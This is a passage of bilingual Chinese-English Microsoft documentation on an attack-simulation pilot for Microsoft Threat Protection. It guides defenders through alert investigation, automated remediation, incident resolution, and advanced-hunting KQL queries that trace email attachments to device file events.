<span data-ttu-id="b1ae0-217">![IP 位址詳細資料頁面的螢幕擷取畫面](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="b1ae0-217">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="b1ae0-218">\*\*警示：使用者和 IP 位址偵測 (SMB)  (來源： Azure ATP) \*\*</span><span class="sxs-lookup"><span data-stu-id="b1ae0-218">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="b1ae0-219">列舉使用伺服器訊息區 (SMB) 通訊協定，可讓攻擊者取得最近的使用者登入資訊，以協助他們透過網路移動，以存取特定的機密帳戶。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-219">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="b1ae0-220">在此偵測中，當 SMB 會話列舉對網域控制站執行時，就會觸發警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-220">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![使用者和 IP 位址偵察之 Azure ATP 警示的螢幕擷取畫面](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="b1ae0-222">複查裝置時程表 [Microsoft Defender ATP]</span><span class="sxs-lookup"><span data-stu-id="b1ae0-222">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="b1ae0-223">在探索此事件中的各種警示後，請移回先前所調查的 [事件] 頁面。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-223">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="b1ae0-224">在 [事件] 頁面中，選取 [ **裝置** ] 索引標籤，以查看 MICROSOFT Defender ATP 和 Azure ATP 所報告之事件中的裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-224">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="b1ae0-225">選取實施攻擊的裝置名稱，以開啟該特定裝置的實體頁面。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-225">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="b1ae0-226">在該頁面中，您可以看到觸發和相關事件的警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-226">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="b1ae0-227">選取 [ **時程表** ] 索引標籤以開啟裝置時程表，並以時間順序查看裝置上觀測到的所有事件和行為，並與所引發的警示交錯。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-227">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![裝置時程表與行為的螢幕擷取畫面](../../media/mtp/fig11.png) 

<span data-ttu-id="b1ae0-229">展開一些較為有趣的行為，可提供有用的詳細資料，例如處理樹。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-229">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="b1ae0-230">例如，向下滾動，直到發現出現警示事件 **可疑程式注入**。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-230">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="b1ae0-231">選取 \*\* 插入的powershell.exe\*\* ，以 notepad.exe 它底下的處理程式事件，在側邊窗格的 [ **事件實體** ] 圖表下，顯示此行為的完整處理樹狀結構。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-231">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="b1ae0-232">如有必要，請使用搜尋列進行篩選。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-232">Use the search bar for filtering if necessary.</span></span>

![選取的 PowerShell 檔案建立行為之進程樹狀結構的螢幕擷取畫面](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="b1ae0-234">審閱使用者資訊 [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="b1ae0-234">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="b1ae0-235">在 [事件] 頁面上，選取 [ **使用者** ] 索引標籤，以顯示攻擊相關的使用者清單。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-235">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="b1ae0-236">該表包含每個使用者的詳細資訊，包括每個使用者的 **調查優先順序** 分數。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-236">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="b1ae0-237">選取 [使用者名稱]，以開啟可以進行進一步調查的使用者設定檔頁面。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-237">Select the user name to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="b1ae0-238">[閱讀有關調查危險使用者的詳細資訊](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-238">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="b1ae0-239">![Cloud App Security 使用者頁面的螢幕擷取畫面](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="b1ae0-239">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="b1ae0-240">自動化調查與補救措施</span><span class="sxs-lookup"><span data-stu-id="b1ae0-240">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="b1ae0-241">在進行這項模擬之前，請觀看下列影片，瞭解自動自我修復功能的相關資訊，以及如何在入口網站中找到它，以及如何協助您進行安全性作業：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-241">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="b1ae0-242">在 Microsoft 365 的安全性中心入口網站中，向後流覽至該事件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-242">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="b1ae0-243">[**事件**] 頁面中的 [**調查**] 索引標籤會顯示 Azure ATP 和 Microsoft Defender atp 所觸發的自動調查。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-243">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="b1ae0-244">下列螢幕擷取畫面只會顯示 Microsoft Defender ATP 所觸發的自動調查。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-244">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="b1ae0-245">根據預設，Microsoft Defender ATP 會自動 remediates 在佇列中找到的專案，這需要進行修復。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-245">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![與事件相關之自動調查的螢幕擷取畫面](../../media/mtp/fig14.png)

<span data-ttu-id="b1ae0-247">選取觸發調查的警示，以開啟 [ **調查詳細資料** ] 頁面。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-247">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="b1ae0-248">您將會看到下列詳細資料：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-248">You’ll see the following details:</span></span>
- <span data-ttu-id="b1ae0-249">觸發自動調查的警示 (s) 。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-249">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="b1ae0-250">受影響的使用者和裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-250">Impacted users and devices.</span></span> <span data-ttu-id="b1ae0-251">如果在其他裝置上找到指示器，也會列出這些額外裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-251">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="b1ae0-252">證據清單。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-252">List of evidence.</span></span> <span data-ttu-id="b1ae0-253">找到並分析的實體，例如檔案、進程、服務、驅動程式和網路位址。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-253">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="b1ae0-254">這些實體會進行分析，以取得警示的可能關係，並評為良性或惡意。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-254">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="b1ae0-255">發現威脅。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-255">Threats found.</span></span> <span data-ttu-id="b1ae0-256">調查期間找到的已知威脅。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-256">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-257">根據時間的不同，自動調查可能仍在執行中。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-257">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="b1ae0-258">在您收集及分析證據並檢查結果之前，請等候幾分鐘完成處理常式。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-258">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="b1ae0-259">重新整理「 **調查詳細資料** 」頁面以取得最新的結果。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-259">Refresh the **Investigation details** page to get the latest findings.</span></span>

![調查詳細資料頁面的螢幕擷取畫面](../../media/mtp/fig15.png)

<span data-ttu-id="b1ae0-261">在自動調查期間，Microsoft Defender ATP 識別了 notepad.exe 程式，這是以要求修正的其中一個專案所注入。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-261">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="b1ae0-262">Microsoft Defender ATP 會在自動修復過程中自動停止可疑的程式注入。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-262">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="b1ae0-263">您可以在測試裝置上看到 [已執行的程式] 清單中 <i>notepad.exe</i> 會消失。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-263">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="b1ae0-264">解決事件</span><span class="sxs-lookup"><span data-stu-id="b1ae0-264">Resolve the incident</span></span>

<span data-ttu-id="b1ae0-265">調查完成並確認待修正之後，請關閉該事件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-265">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="b1ae0-266">選取 [ **管理事件**]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-266">Select **Manage incident**.</span></span> <span data-ttu-id="b1ae0-267">將狀態設定為 [ **解決事件** ]，然後選取相關的分類。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-267">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="b1ae0-268">當事件解決時，它會在 Microsoft 365 的安全性中心和相關的入口網站中關閉所有相關聯的警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-268">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![[事件] 頁面的螢幕擷取畫面，其中包含「開啟的管理事件」面板，您可以在其中按一下參數來解決事件。](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="b1ae0-270">這可讓事件管理和自動化調查和修正案例的攻擊類比。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-270">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="b1ae0-271">下一個模擬會透過主動威脅搜尋潛在的惡意檔案，將您引導。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-271">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="b1ae0-272">高級搜尋案例</span><span class="sxs-lookup"><span data-stu-id="b1ae0-272">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-273">在您完成類比之前，請觀看下列影片，瞭解高級搜尋概念，請參閱您可以在入口網站中找到的位置，以及瞭解如何在您的安全性作業中協助您進行下列動作：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-273">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="b1ae0-274">搜尋環境需求</span><span class="sxs-lookup"><span data-stu-id="b1ae0-274">Hunting environment requirements</span></span>
<span data-ttu-id="b1ae0-275">此案例需要單一內部信箱和裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-275">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="b1ae0-276">您也需要外部電子郵件帳戶來傳送測試郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-276">You'll also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="b1ae0-277">確認您的租使用者已 [啟用 Microsoft 威脅防護](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-277">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="b1ae0-278">識別要用於接收電子郵件的目標信箱。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-278">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="b1ae0-279">a.</span><span class="sxs-lookup"><span data-stu-id="b1ae0-279">a.</span></span>  <span data-ttu-id="b1ae0-280">此信箱必須由 Office 365 ATP b 監控。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-280">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="b1ae0-281">要求3裝置必須存取此信箱</span><span class="sxs-lookup"><span data-stu-id="b1ae0-281">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="b1ae0-282">設定測試裝置： a。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-282">Configure a test device: a.</span></span>  <span data-ttu-id="b1ae0-283">請確認您使用的是 Windows 10 版本1903或更新版本。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-283">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="b1ae0-284">b.</span><span class="sxs-lookup"><span data-stu-id="b1ae0-284">b.</span></span>  <span data-ttu-id="b1ae0-285">將測試裝置加入測試網域。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-285">Join the test device to the test domain.</span></span>
    <span data-ttu-id="b1ae0-286">c.</span><span class="sxs-lookup"><span data-stu-id="b1ae0-286">c.</span></span>  <span data-ttu-id="b1ae0-287">[開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-287">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="b1ae0-288">如果您在啟用 Windows Defender 防病毒時遇到問題，請參閱 [此疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-288">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="b1ae0-289">d.</span><span class="sxs-lookup"><span data-stu-id="b1ae0-289">d.</span></span>  <span data-ttu-id="b1ae0-290">[板載至 Microsoft Defender Advanced 威脅防護 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-290">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="b1ae0-291">執行模擬</span><span class="sxs-lookup"><span data-stu-id="b1ae0-291">Run the simulation</span></span>
1.  <span data-ttu-id="b1ae0-292">從外部電子郵件帳戶，將電子郵件傳送至「測試環境需求」區段之步驟2中所識別的信箱。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-292">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="b1ae0-293">包含可透過任何現有電子郵件篩選原則所允許的附件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-293">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="b1ae0-294">此檔案不需要是惡意或可執行檔。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-294">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="b1ae0-295">建議的檔案類型為 <i>.pdf</i>、 <i>.exe</i> (如果允許) 或 Office 檔（如 Word 檔案）。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-295">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="b1ae0-296">從「測試環境需求」一節的步驟3中所設定的裝置，開啟已傳送的電子郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-296">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="b1ae0-297">開啟附件或將檔儲存到裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-297">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="b1ae0-298">**開始搜尋**</span><span class="sxs-lookup"><span data-stu-id="b1ae0-298">**Go hunting**</span></span>
1.  <span data-ttu-id="b1ae0-299">開啟 security.microsoft.com 入口網站。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-299">Open the security.microsoft.com portal.</span></span>

2.  <span data-ttu-id="b1ae0-300">流覽至 **搜尋 > 高級搜尋**。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-300">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![M365 安全性中心入口網站導覽列中高級搜尋的螢幕擷取畫面](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="b1ae0-302">建立以收集電子郵件事件開始的查詢。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-302">Build a query that starts by gathering email events.</span></span>

    1.  <span data-ttu-id="b1ae0-303">在 [查詢] 窗格中，選取 [新增]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-303">From the query pane, select New.</span></span>
    
    1.  <span data-ttu-id="b1ae0-304">在架構中按兩下 [EmailEvents] 表格。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-304">Double-click on the EmailEvents table from the schema.</span></span>

        ```
        EmailEvents 
        ```                                        

    1.  <span data-ttu-id="b1ae0-305">將時間範圍變更為過去24小時。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-305">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="b1ae0-306">假設您在執行上述類比時所傳送的電子郵件是在過去24小時內，否則請變更時間範圍。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-306">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
    
        ![您可以變更時間範圍的螢幕擷取畫面。](../../media/mtp/fig18.png) 

    1.  <span data-ttu-id="b1ae0-309">執行查詢。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-309">Run the query.</span></span>  <span data-ttu-id="b1ae0-310">根據試驗的環境而定，您可能會有許多結果。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-310">You may have many results depending on the environment for the pilot.</span></span>  

        > [!NOTE]
        > <span data-ttu-id="b1ae0-311">請參閱下一個步驟，篩選選項以限制資料傳回。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-311">See the next step for filtering options to limit data return.</span></span>

        ![高級搜尋查詢結果的螢幕擷取畫面](../../media/mtp/fig19.png) 

        > [!NOTE]
        > <span data-ttu-id="b1ae0-313">「高級搜尋」會以表格式資料顯示查詢結果。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-313">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="b1ae0-314">您也可以選擇以其他格式類型（如圖表）來查看資料。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-314">You can also opt to view the data in other format types such as charts.</span></span>    

    1.  <span data-ttu-id="b1ae0-315">查看結果，查看是否可以識別您開啟的電子郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-315">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="b1ae0-316">最多可能需要2個小時的時間，郵件才會顯示在高級搜尋中。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-316">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="b1ae0-317">如果電子郵件環境很大，而且有許多結果，您可能想要使用 [ **顯示篩選] 選項** 來尋找郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-317">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="b1ae0-318">在範例中，電子郵件是從 Yahoo 帳戶傳送。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-318">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="b1ae0-319">按一下 [SenderFromDomain] 區段底下的 [ **+** **yahoo.com** ] 旁的圖示，然後按一下 [套用 **]，** 將選取的網域新增至查詢。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-319">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="b1ae0-320">在執行模擬以篩選結果的步驟1中，使用用於傳送測試郵件的網域或電子郵件帳戶。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-320">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="b1ae0-321">再次執行查詢以取得較小的結果集，以確認您看到類比中的郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-321">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
        ![Screenshot of the filters. Use filters to narrow down the search, and find what you’re looking for faster.](../../media/mtp/fig20.png) 

        ```console
        EmailEvents 
        | where SenderMailFromDomain == "yahoo.com"
        ```

    1.  <span data-ttu-id="b1ae0-322">按一下查詢中產生的資料列，以便檢查記錄。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-322">Click the resulting rows from the query so you can inspect the record.</span></span>
   
        ![選取高級搜尋結果時所開啟之檢查記錄側邊窗格的螢幕擷取畫面](../../media/mtp/fig21.png) 

4.  <span data-ttu-id="b1ae0-324">現在，您已確認您可以看到電子郵件，新增附件的篩選器。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-324">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="b1ae0-325">在環境中著重于所有包含附件的電子郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-325">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="b1ae0-326">在此情況下，會將焦點移到輸入電子郵件，而不是從您的環境寄出。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-326">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="b1ae0-327">移除您已新增的任何篩選，以找出郵件並新增 "|其中**AttachmentCount > 0**和**EmailDirection**  ==  **"Inbound" "**</span><span class="sxs-lookup"><span data-stu-id="b1ae0-327">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

    <span data-ttu-id="b1ae0-328">下列查詢會顯示結果，其清單比您的所有電子郵件事件的初始查詢更短：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-328">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"

    ```

5.  <span data-ttu-id="b1ae0-329">接下來，包含附件的相關資訊 (例如：檔案名、雜湊) 結果集。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-329">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="b1ae0-330">若要這麼做，請加入 **EmailAttachmentInfo** 表格。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-330">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="b1ae0-331">在此情況下，要用於加入的一般欄位是 **NetworkMessageId** 和 **RecipientObjectId**。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-331">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="b1ae0-332">下列查詢也包含其他行 "| **project-Rename EmailTimestamp = Timestamp**"，可協助識別與您將在下一個步驟中新增之檔案動作相關的電子郵件與時間戳記有關的時間戳記。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-332">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    ```

6.  <span data-ttu-id="b1ae0-333">接下來，使用**EmailAttachmentInfo**表格中的**SHA256**值，尋找在該雜湊的端點) 上發生的**DeviceFileEvents** (檔案動作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-333">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="b1ae0-334">這裡的一般欄位將會是附件的 SHA256 雜湊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-334">The common field here will be the SHA256 hash for the attachment.</span></span>

    <span data-ttu-id="b1ae0-335">產生的表格現在會包含端點)  (的詳細資料，例如，裝置名稱、已完成的動作 (在此情況下，篩選為只包括 FileCreated 事件) ，以及儲存檔案的位置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-335">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="b1ae0-336">也會包含與處理常式相關聯的帳戶名稱。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-336">The account name associated with the process will also be included.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    ```

<span data-ttu-id="b1ae0-337">您現在已經建立了一個查詢，它會識別所有使用者開啟或儲存附件的輸入電子郵件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-337">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="b1ae0-338">您也可以精煉此查詢，以篩選特定寄件者網域、檔案大小、檔案類型等等。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-338">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="b1ae0-339">函數是一種特殊的聯接方式，可讓您將更多的 TI 資料（如其流行、簽署者資訊等等）提取到更多的檔。 若要取得檔案的詳細資料，請使用 \*\*FileProfile ( # B1 \*\* 函數豐富：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-339">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```


<span data-ttu-id="b1ae0-340">**建立偵測**</span><span class="sxs-lookup"><span data-stu-id="b1ae0-340">**Create a detection**</span></span>

<span data-ttu-id="b1ae0-341">當您建立一個查詢，識別您想要針對未來的情況收到 **警示** 的資訊時，您可以從查詢建立自訂偵測。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-341">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="b1ae0-342">自訂偵測會根據您設定的頻率執行查詢，而查詢的結果會根據您所選擇的受影響資產，建立安全性警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-342">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="b1ae0-343">這些警示會與事件相關聯，而且可以被會審為其中一項產品所產生的任何其他安全性警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-343">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

